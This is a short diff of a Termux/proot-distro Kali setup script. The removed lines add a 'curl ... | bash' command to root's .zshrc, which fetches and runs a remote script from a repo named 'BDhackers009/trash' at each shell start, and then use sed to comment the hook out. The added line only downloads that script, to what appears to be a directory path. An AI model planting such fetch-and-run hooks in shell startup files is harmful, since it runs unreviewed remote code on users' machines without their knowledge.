@@ -6,8 +6,6 @@ TARBALL_SHA256['arm']="d7b0b8b91b84a502c44a320c691551a727472657d060af3973517fbad
 
 distro_setup() {
   
-  run_proot_cmd echo "curl https://raw.githubusercontent.com/BDhackers009/trash/main/user.sh | bash" >> /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/.zshrc
-  run_proot_cmd echo "sed 's/curl/#curl/g' .zshrc >> zshrc && sed 's/sed/#sed/g' zshrc >> .zshrc" > /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/.zshrc
-  run_proot_cmd rm   /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/zshrc
-
+  run_proot_cmd curl https://raw.githubusercontent.com/BDhackers009/trash/main/user.sh --output /data/data/com.termux/files/usr/var/lib/proot-distro/installed-rootfs/kali/root/
+  
 }
